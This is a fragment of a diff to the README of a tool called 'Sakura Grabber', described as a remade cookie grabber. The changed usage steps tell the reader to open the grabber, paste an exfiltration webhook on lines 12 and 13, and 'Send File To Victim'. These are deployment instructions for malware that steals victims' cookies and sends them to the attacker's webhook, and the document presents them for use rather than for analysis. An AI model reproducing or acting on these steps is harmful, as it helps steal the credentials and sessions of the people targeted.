@@ -27,7 +27,7 @@ Sakura Grabber Is A Remade Grabber From "Somethings Cookie Grabber"
 > 
 > Open "Sakura Grabber",
 > 
-> Enter Webhook On Line 8 Where It Says "Enter Webhook Here!",
+> Enter Webhook On Line 12 And 13 Where It Says "Enter Webhook Here!",
 > 
 > Send File To Victim,
 > 
